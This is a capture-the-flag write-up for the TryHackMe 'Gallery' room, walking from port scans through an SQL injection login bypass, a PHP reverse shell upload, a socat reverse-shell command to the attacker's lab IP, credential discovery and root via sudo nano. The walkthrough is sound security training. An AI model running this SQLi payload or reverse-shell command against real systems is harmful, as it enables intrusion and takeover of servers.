# Gallery - TryHackMe Write-up

Detailed write-up for the [Gallery](https://tryhackme.com/room/gallery666) room at [TryHackMe.com](https://tryhackme.com/)

**Room URL:** https://tryhackme.com/room/gallery666

## Table of Contents

- [Port Scan](#port-scan)
- [Directory Enumeration](#directory-enumeration)
- [Webpage](#webpage)
- [SQL Injection](#sql-injection)
  - [Automatic Exploit](#automatic-exploit)
  - [Manual Exploit](#manual-exploit)
- [Reverse Shell](#reverse-shell)
  - [Shell Stabilization](#shell-stabilization)
- [Database Enumeration](#database-enumeration)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

---

## Port Scan

Port scanning using `nmap` revealed that a couple of ports are open.

```
# Nmap 7.92 scan initiated Sun Feb 13 04:47:02 2022 as: nmap -vv -sS -oN enum.txt 10.10.47.6
Nmap scan report for 10.10.47.6
Host is up, received reset ttl 63 (0.064s latency).
Scanned at 2022-02-13 04:47:02 EST for 2s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Feb 13 04:47:04 2022 -- 1 IP address (1 host up) scanned in 1.90 seconds
```

Conducting a more detailed scan on the ports 80 and 8080 revealed the following information.

```
# Nmap 7.92 scan initiated Sun Feb 13 04:47:17 2022 as: nmap -vv -sS -A -p 80,8080 -oN open_ports.txt 10.10.47.6
Nmap scan report for 10.10.47.6
Host is up, received echo-reply ttl 63 (0.055s latency).
Scanned at 2022-02-13 04:47:18 EST for 15s

PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
8080/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 20CBC8F4B629DEB39494233A39773553
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Simple Image Gallery System
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
```

---

## Directory Enumeration

Directory enumeration using `gobuster` revealed a directory named `gallery`, which contains the login page.

**Key Finding:** A directory named `/gallery` was discovered containing the CMS login interface.

---

## Webpage

Port 80 redirects to the Apache2 Ubuntu default webpage, while port 8080 hosts the actual gallery application.

The webpage displays a login form for the Simple Image Gallery System (SIGS), which is vulnerable to SQL Injection attacks.

**Observation:** The CMS name can be identified from the page source and headers.

---

## SQL Injection

### Automatic Exploit

An existing Python script for Remote Code Execution was found on Exploit-DB (exploit 50214). This exploit injects an SQL query into the username field and uploads a PHP webshell into the `uploads` directory.

**Result:** The uploaded webshell accepts system commands for remote code execution.

### Manual Exploit

The SQLi payload for the username field is:
```
admin' or '1'='1'#
```

Leave the password field empty. This payload:
- Breaks out of the username string with `'`
- Adds an OR condition that is always true: `'1'='1'`
- Comments out the password check with `#`

**Result:** Successfully bypasses authentication and grants access to the admin panel.

---

## Reverse Shell

### Initial Shell

Under the Albums page, I selected "Sample Images" and uploaded a PHP reverse shell. No file upload filters were present, allowing arbitrary file uploads.

**Setup:**
1. Set up a netcat listener on the host machine
2. Opened the uploaded PHP file to trigger the reverse shell
3. Successfully obtained a reverse shell connection

### Shell Stabilization

For a more stable shell, I uploaded the static binary of `socat` utility to the target machine.

**Process:**
1. Downloaded socat binary from [static-binaries repository](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
2. Started a Python HTTP server on the host machine
3. Downloaded socat on target using `wget` to `/var/www/html`
4. Started socat listener on host machine
5. Executed `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.9.9.47:4444` on target
6. Obtained a stable socat reverse shell

---

## Database Enumeration

Inside the webserver's `/var/www/html` directory, a file containing MySQL database credentials was discovered.

**Credentials Found:**
- Database host, username, and password were exposed
- Connected to the MySQL database
- Located administrator's password hash in the database

---

## User Flag

Exploring the target system directories, backups for user `mike` were discovered. These backups contained the password for the `mike` account.

**Process:**
1. Found backup files containing credentials
2. Switched to user `mike` using the discovered password
3. Navigated to `/home/mike` directory
4. Read `user.txt` file to obtain the user flag

---

## Privilege Escalation

Issuing `sudo -l` showed that user `mike` could run `/bin/bash` and `/opt/rootkit.sh` as root.

**Challenge:** The socat shell had terminal emulation issues (TERM set as `dumb`), preventing nano editor from starting.

**Solution:**
1. Set terminal emulator: `export TERM=xterm`
2. Executed `/bin/bash /opt/rootkit.sh` as root
3. This opened the nano editor running with root privileges
4. Used GTFOBins exploit for nano to spawn a root shell
5. Navigated to `/root` directory and read `root.txt` to obtain the root flag

---

## Conclusion

**Summary of exploitation steps:**

1. Identified two open ports (80 and 8080) using nmap
2. Discovered a vulnerable Image Gallery CMS on port 8080
3. Exploited SQL Injection vulnerability in the login form using payload: `admin' or '1'='1'#`
4. Gained access to the admin panel
5. Uploaded a PHP reverse shell through the file upload functionality
6. Established initial reverse shell with netcat
7. Upgraded shell stability using socat utility
8. Found MySQL credentials in `/var/www/html` configuration files
9. Enumerated the database and discovered admin password hash
10. Located user `mike`'s credentials in backup files
11. Switched to user `mike` and obtained user flag
12. Exploited sudo privileges to run nano as root
13. Used GTFOBins nano exploit to gain root shell
14. Retrieved root flag from `/root/root.txt`

**Key Vulnerabilities Exploited:**
- SQL Injection in authentication form
- Unrestricted file upload (no extension/type validation)
- Exposed database credentials in configuration files
- Weak privilege escalation via nano editor
- Insecure sudo configuration

---

**Write-up Date:** February 13, 2022
**Author:** Tito Oscar Mwaisengela (@tito-devsec)
**Room Difficulty:** Medium
**Room Link:** https://tryhackme.com/room/gallery666
